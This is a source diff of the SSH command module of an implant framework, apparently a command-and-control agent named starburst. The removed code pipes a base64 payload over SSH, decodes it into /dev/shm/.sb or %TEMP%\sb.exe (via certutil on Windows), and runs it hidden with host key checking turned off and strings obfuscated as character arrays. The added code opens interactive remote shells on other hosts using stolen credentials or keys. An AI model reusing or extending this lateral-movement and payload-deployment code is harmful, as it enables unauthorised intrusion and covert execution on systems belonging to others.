@@ -4,137 +4,54 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <ssh_client.h>
 
 #ifdef INCLUDE_CMD_SSH
 
 using namespace stardust;
 using namespace starburst;
 
-__attribute__((section(".text$B")))
-static bool pipe_write(instance& inst, HANDLE pipe, const char* data, uint32_t len) {
-    DWORD written = 0;
-    uint32_t total = 0;
-    while (total < len) {
-        if (!inst.kernel32.WriteFile(pipe, data + total, len - total, &written, nullptr))
-            return false;
-        total += written;
-    }
-    return true;
-}
+static void queue_interactive_output(instance& inst, const char* task_uuid,
+    const uint8_t* data, uint32_t data_len, uint8_t msg_type)
+{
+    // Wire format: [task_uuid(36)][msg_type(1)][data_len(4)][data]
+    uint32_t entry_size = 36 + 1 + 4 + data_len;
+    uint32_t needed = inst.interactive_queue.length + 4 + entry_size;
 
-__attribute__((section(".text$B")))
-static bool pipe_write_str(instance& inst, HANDLE pipe, const char* str) {
-    return pipe_write(inst, pipe, str, str_len(str));
-}
-
-__attribute__((section(".text$B")))
-static void deploy_linux(
-    instance& inst, HANDLE h_stdin_write,
-    const char* binary_b64, uint32_t binary_b64_len
-) {
-    char nl = '\n';
-
-    char bin_cmd1[] = "base64 -d << 'STARBURST_BIN_EOF' > /dev/shm/.sb\n";
-    char bin_cmd2[] = "STARBURST_BIN_EOF\n";
-
-    pipe_write_str(inst, h_stdin_write, bin_cmd1);
-
-    uint32_t b64_off = 0;
-    while (b64_off < binary_b64_len) {
-        uint32_t chunk = binary_b64_len - b64_off;
-        if (chunk > 76) chunk = 76;
-        pipe_write(inst, h_stdin_write, binary_b64 + b64_off, chunk);
-        pipe_write(inst, h_stdin_write, &nl, 1);
-        b64_off += chunk;
-    }
-    pipe_write_str(inst, h_stdin_write, bin_cmd2);
-
-    LARGE_INTEGER delay;
-    delay.QuadPart = -20000000LL; // 2s
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
-
-    char exec_cmd[] = "chmod +x /dev/shm/.sb && nohup /dev/shm/.sb >/dev/null 2>&1 &\n";
-    pipe_write_str(inst, h_stdin_write, exec_cmd);
-
-    delay.QuadPart = -10000000LL; // 1s
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
-
-    char check_cmd[] = "echo DEPLOY_STATUS=$?\n";
-    pipe_write_str(inst, h_stdin_write, check_cmd);
-
-    delay.QuadPart = -10000000LL;
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
-}
-
-__attribute__((section(".text$B")))
-static void deploy_windows(
-    instance& inst, HANDLE h_stdin_write,
-    const char* binary_b64, uint32_t binary_b64_len
-) {
-    char nl = '\n';
-    LARGE_INTEGER delay;
-
-    /* force cmd.exe shell regardless of default SSH shell (handles PS default) */
-    char cmd_shell[] = "cmd.exe\n";
-    pipe_write_str(inst, h_stdin_write, cmd_shell);
-    delay.QuadPart = -10000000LL; // 1s
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
-
-    /* write BEGIN marker for certutil */
-    /* [MALLEABLE] change path from %TEMP% to desired drop location */
-    char hdr_cmd[] = "echo -----BEGIN CERTIFICATE----->%TEMP%\\sb.b64\n";
-    pipe_write_str(inst, h_stdin_write, hdr_cmd);
-
-    /* write base64 data in 76-char lines via echo >> */
-    char echo_prefix[] = "echo ";
-    char redir_append[] = ">>%TEMP%\\sb.b64\n";
-
-    uint32_t b64_off = 0;
-    while (b64_off < binary_b64_len) {
-        uint32_t chunk = binary_b64_len - b64_off;
-        if (chunk > 76) chunk = 76;
-
-        pipe_write_str(inst, h_stdin_write, echo_prefix);
-        pipe_write(inst, h_stdin_write, binary_b64 + b64_off, chunk);
-        pipe_write_str(inst, h_stdin_write, redir_append);
-        b64_off += chunk;
+    if (needed > inst.interactive_queue.capacity) {
+        uint32_t nc = inst.interactive_queue.capacity == 0 ? 4096 : inst.interactive_queue.capacity;
+        while (nc < needed) nc *= 2;
+        inst.interactive_queue.buffer = static_cast<uint8_t*>(
+            inst.heap_realloc(inst.interactive_queue.buffer, nc));
+        inst.interactive_queue.capacity = nc;
     }
 
-    /* write END marker */
-    char ftr_cmd[] = "echo -----END CERTIFICATE----->>%TEMP%\\sb.b64\n";
-    pipe_write_str(inst, h_stdin_write, ftr_cmd);
+    auto qb = inst.interactive_queue.buffer + inst.interactive_queue.length;
 
-    delay.QuadPart = -20000000LL; // 2s
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
+    // 4-byte length prefix
+    qb[0] = (entry_size >> 24) & 0xFF;
+    qb[1] = (entry_size >> 16) & 0xFF;
+    qb[2] = (entry_size >> 8)  & 0xFF;
+    qb[3] = entry_size & 0xFF;
+    qb += 4;
 
-    /* decode with certutil */
-    /* [MALLEABLE] change sb.exe to desired filename */
-    char decode_cmd[] = "certutil -decode %TEMP%\\sb.b64 %TEMP%\\sb.exe >nul 2>&1\n";
-    pipe_write_str(inst, h_stdin_write, decode_cmd);
+    // task UUID (36 bytes)
+    memory::copy(qb, (void*)task_uuid, 36);
+    qb += 36;
 
-    delay.QuadPart = -20000000LL; // 2s
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
+    // message type
+    *qb++ = msg_type;
 
-    /* cleanup b64 file */
-    char del_cmd[] = "del %TEMP%\\sb.b64\n";
-    pipe_write_str(inst, h_stdin_write, del_cmd);
+    // data length + data
+    qb[0] = (data_len >> 24) & 0xFF;
+    qb[1] = (data_len >> 16) & 0xFF;
+    qb[2] = (data_len >> 8)  & 0xFF;
+    qb[3] = data_len & 0xFF;
+    qb += 4;
+    if (data_len > 0)
+        memory::copy(qb, (void*)data, data_len);
 
-    /* execute payload */
-    char exec_cmd[] = "start \"\" /b %TEMP%\\sb.exe\n";
-    pipe_write_str(inst, h_stdin_write, exec_cmd);
-
-    delay.QuadPart = -10000000LL; // 1s
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
-
-    char check_cmd[] = "echo DEPLOY_STATUS=%ERRORLEVEL%\n";
-    pipe_write_str(inst, h_stdin_write, check_cmd);
-
-    delay.QuadPart = -10000000LL;
-    inst.ntdll.NtDelayExecution(FALSE, &delay);
-
-    /* exit cmd.exe (back to SSH shell) */
-    char exit_cmd_shell[] = "exit\n";
-    pipe_write_str(inst, h_stdin_write, exit_cmd_shell);
+    inst.interactive_queue.length += 4 + entry_size;
 }
 
 auto declfn starburst::cmd_ssh(
@@ -149,20 +66,12 @@ auto declfn starburst::cmd_ssh(
     auto username = parser_string(params, &user_len);
     uint32_t cred_len = 0;
     auto credential = parser_string(params, &cred_len);
-    uint8_t use_key = parser_byte(params);
-    uint8_t target_os = parser_byte(params);
-    uint32_t binary_b64_len = 0;
-    auto binary_b64 = parser_string(params, &binary_b64_len);
+    uint32_t key_len = 0;
+    auto key_data = (const uint8_t*)parser_string(params, &key_len);
 
     if (!hostname || host_len == 0 || !username || user_len == 0) {
         queue_response(inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>(const_cast<char*>("missing hostname or username")));
-        return;
-    }
-
-    if (!binary_b64 || binary_b64_len == 0) {
-        queue_response(inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>(const_cast<char*>("missing payload binary")));
         return;
     }
 
@@ -174,171 +83,91 @@ auto declfn starburst::cmd_ssh(
     if (cred_len >= 256) cred_len = 255;
     memory::copy(host_buf, hostname, host_len);
     memory::copy(user_buf, username, user_len);
-    if (credential && cred_len > 0) {
+    if (credential && cred_len > 0)
         memory::copy(cred_buf, credential, cred_len);
-    }
 
-    /* create pipes for ssh.exe stdin/stdout */
-    SECURITY_ATTRIBUTES sa = {};
-    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
-    sa.bInheritHandle = TRUE;
+    if (port == 0) port = 22;
 
-    HANDLE h_stdin_read = nullptr, h_stdin_write = nullptr;
-    HANDLE h_stdout_read = nullptr, h_stdout_write = nullptr;
-
-    if (!inst.kernel32.CreatePipe(&h_stdin_read, &h_stdin_write, &sa, 0)) {
-        queue_response(inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>(const_cast<char*>("stdin pipe failed")));
+    // Connect
+    int32_t sess_idx = ssh_connect(inst, host_buf, (uint16_t)port, user_buf, cred_buf,
+        key_data, key_len);
+    if (sess_idx < 0) {
+        const char* err = ssh_last_error(inst);
+        if (err) {
+            char err_msg[384] = {};
+            char prefix[] = { 'S','S','H',' ','c','o','n','n','e','c','t',' ','f','a','i','l','e','d',':',' ', 0 };
+            uint32_t plen = str_len(prefix);
+            memory::copy(err_msg, prefix, plen);
+            uint32_t elen = str_len(err);
+            if (elen > 360) elen = 360;
+            memory::copy(err_msg + plen, (void*)err, elen);
+            queue_response(inst, task_uuid, RESPONSE_ERROR, err_msg);
+        } else {
+            queue_response(inst, task_uuid, RESPONSE_ERROR,
+                symbol<char*>(const_cast<char*>("SSH connection failed")));
+        }
         return;
     }
-    if (!inst.kernel32.CreatePipe(&h_stdout_read, &h_stdout_write, &sa, 0)) {
-        inst.kernel32.CloseHandle(h_stdin_read);
-        inst.kernel32.CloseHandle(h_stdin_write);
-        queue_response(inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>(const_cast<char*>("stdout pipe failed")));
+
+    // Open interactive shell
+    if (!ssh_shell_open(inst, (uint32_t)sess_idx)) {
+        const char* err = ssh_last_error(inst);
+        char err_msg[384] = {};
+        char prefix[] = { 'S','h','e','l','l',' ','o','p','e','n',' ','f','a','i','l','e','d',':',' ', 0 };
+        uint32_t plen = str_len(prefix);
+        memory::copy(err_msg, prefix, plen);
+        if (err) {
+            uint32_t elen = str_len(err);
+            if (elen > 360) elen = 360;
+            memory::copy(err_msg + plen, (void*)err, elen);
+        }
+        ssh_disconnect(inst, (uint32_t)sess_idx);
+        queue_response(inst, task_uuid, RESPONSE_ERROR, err_msg);
         return;
     }
 
-    /* build ssh.exe command line */
-    char cmdline[1024] = {};
-    wchar_t wcmdline[1024] = {};
-    uint32_t off = 0;
-
-    char ssh_exe[] = { 's', 's', 'h', '.', 'e', 'x', 'e', 0 };
-    char opt_nocheck[] = { ' ', '-', 'o', ' ', 'S', 't', 'r', 'i', 'c', 't',
-        'H', 'o', 's', 't', 'K', 'e', 'y', 'C', 'h', 'e', 'c', 'k', 'i',
-        'n', 'g', '=', 'n', 'o', 0 };
-    char opt_tt[] = { ' ', '-', 't', 't', 0 };
-
-    uint32_t slen = str_len(ssh_exe);
-    memory::copy(cmdline + off, ssh_exe, slen); off += slen;
-    slen = str_len(opt_nocheck);
-    memory::copy(cmdline + off, opt_nocheck, slen); off += slen;
-    slen = str_len(opt_tt);
-    memory::copy(cmdline + off, opt_tt, slen); off += slen;
-
-    if (use_key) {
-        char opt_i[] = { ' ', '-', 'i', ' ', 0 };
-        slen = str_len(opt_i);
-        memory::copy(cmdline + off, opt_i, slen); off += slen;
-        slen = str_len(cred_buf);
-        memory::copy(cmdline + off, cred_buf, slen); off += slen;
+    // Register interactive session
+    bool registered = false;
+    for (uint32_t i = 0; i < inst.MAX_INTERACTIVE_SESSIONS; i++) {
+        if (!inst.interactive_sessions[i].active) {
+            memory::copy(inst.interactive_sessions[i].task_uuid, task_uuid, 36);
+            inst.interactive_sessions[i].task_uuid[36] = 0;
+            inst.interactive_sessions[i].ssh_session_idx = (uint32_t)sess_idx;
+            inst.interactive_sessions[i].active = true;
+            registered = true;
+            break;
+        }
     }
 
-    char opt_p[] = { ' ', '-', 'p', ' ', 0 };
-    slen = str_len(opt_p);
-    memory::copy(cmdline + off, opt_p, slen); off += slen;
-    char port_str[8] = {};
-    int_to_str(port_str, port, 10);
-    slen = str_len(port_str);
-    memory::copy(cmdline + off, port_str, slen); off += slen;
-
-    cmdline[off++] = ' ';
-    slen = str_len(user_buf);
-    memory::copy(cmdline + off, user_buf, slen); off += slen;
-    cmdline[off++] = '@';
-    slen = str_len(host_buf);
-    memory::copy(cmdline + off, host_buf, slen); off += slen;
-    cmdline[off] = 0;
-
-    inst.kernel32.MultiByteToWideChar(65001, 0, cmdline, -1, wcmdline, 1024);
-
-    STARTUPINFOW si = {};
-    si.cb = sizeof(STARTUPINFOW);
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = h_stdin_read;
-    si.hStdOutput = h_stdout_write;
-    si.hStdError = h_stdout_write;
-
-    PROCESS_INFORMATION pi = {};
-    BOOL created = inst.kernel32.CreateProcessW(
-        nullptr, wcmdline, nullptr, nullptr, TRUE,
-        0x08000000, nullptr, nullptr, &si, &pi);
-
-    inst.kernel32.CloseHandle(h_stdin_read);
-    inst.kernel32.CloseHandle(h_stdout_write);
-
-    if (!created) {
-        inst.kernel32.CloseHandle(h_stdin_write);
-        inst.kernel32.CloseHandle(h_stdout_read);
+    if (!registered) {
+        ssh_disconnect(inst, (uint32_t)sess_idx);
         queue_response(inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>(const_cast<char*>("ssh.exe launch failed")));
+            symbol<char*>(const_cast<char*>("no free interactive session slot")));
         return;
     }
-    inst.kernel32.CloseHandle(pi.hThread);
 
-    /* if password auth, wait for prompt and send password */
-    if (!use_key && str_len(cred_buf) > 0) {
-        LARGE_INTEGER delay;
-        delay.QuadPart = -30000000LL; // 3s
-        inst.ntdll.NtDelayExecution(FALSE, &delay);
-
-        pipe_write_str(inst, h_stdin_write, cred_buf);
-        char nl = '\n';
-        pipe_write(inst, h_stdin_write, &nl, 1);
-    }
-
-    /* wait for shell prompt after login */
-    LARGE_INTEGER login_delay;
-    login_delay.QuadPart = -20000000LL; // 2s
-    inst.ntdll.NtDelayExecution(FALSE, &login_delay);
-
-    /* deploy based on target OS - 0=linux, 1=windows */
-    if (target_os == 0) {
-        deploy_linux(inst, h_stdin_write, binary_b64, binary_b64_len);
-    } else {
-        deploy_windows(inst, h_stdin_write, binary_b64, binary_b64_len);
-    }
-
-    /* exit ssh session */
-    char exit_cmd[] = "exit\n";
-    pipe_write_str(inst, h_stdin_write, exit_cmd);
-
-    /* wait for ssh.exe to exit (max 60s - Windows deploy is slower) */
-    inst.kernel32.WaitForSingleObject(pi.hProcess, 60000);
-
-    /* read any output */
-    char output[4096] = {};
-    DWORD avail = 0;
-    DWORD bytes_read = 0;
-    if (inst.kernel32.PeekNamedPipe(h_stdout_read, nullptr, 0, nullptr, &avail, nullptr) && avail > 0) {
-        uint32_t to_read = avail < 4000 ? avail : 4000;
-        inst.kernel32.ReadFile(h_stdout_read, output, to_read, &bytes_read, nullptr);
-        output[bytes_read] = 0;
-    }
-
-    inst.kernel32.CloseHandle(h_stdin_write);
-    inst.kernel32.CloseHandle(h_stdout_read);
-    inst.kernel32.TerminateProcess(pi.hProcess, 0);
-    inst.kernel32.CloseHandle(pi.hProcess);
-
-    /* build result message */
+    // Send initial output message with connection info
     char result[512] = {};
+    char msg[] = { 'C','o','n','n','e','c','t','e','d',' ','t','o',' ', 0 };
     uint32_t roff = 0;
-    char msg_deployed[] = { 'D', 'e', 'p', 'l', 'o', 'y', 'e', 'd', ' ',
-        'a', 'g', 'e', 'n', 't', ' ', 't', 'o', ' ', 0 };
-    slen = str_len(msg_deployed);
-    memory::copy(result + roff, msg_deployed, slen); roff += slen;
+    uint32_t mlen = str_len(msg);
+    memory::copy(result + roff, msg, mlen); roff += mlen;
     memory::copy(result + roff, user_buf, str_len(user_buf)); roff += str_len(user_buf);
     result[roff++] = '@';
     memory::copy(result + roff, host_buf, str_len(host_buf)); roff += str_len(host_buf);
     result[roff++] = ':';
+    char port_str[8] = {};
+    int_to_str(port_str, port, 10);
     memory::copy(result + roff, port_str, str_len(port_str)); roff += str_len(port_str);
-
-    if (target_os == 0) {
-        char msg_path[] = { ' ', '(', '/', 'd', 'e', 'v', '/', 's', 'h', 'm',
-            '/', '.', 's', 'b', ')', 0 };
-        slen = str_len(msg_path);
-        memory::copy(result + roff, msg_path, slen); roff += slen;
-    } else {
-        char msg_path[] = { ' ', '(', '%', 'T', 'E', 'M', 'P', '%', '\\',
-            's', 'b', '.', 'e', 'x', 'e', ')', 0 };
-        slen = str_len(msg_path);
-        memory::copy(result + roff, msg_path, slen); roff += slen;
-    }
+    result[roff++] = '\n';
     result[roff] = 0;
 
-    queue_response(inst, task_uuid, RESPONSE_SUCCESS, result);
+    queue_interactive_output(inst, task_uuid,
+        (const uint8_t*)result, roff, INTERACTIVE_OUTPUT);
+
+    // Task stays alive - RESPONSE_PROCESSING keeps it open
+    queue_response(inst, task_uuid, RESPONSE_PROCESSING,
+        symbol<char*>(const_cast<char*>("")));
 }
 
 #endif
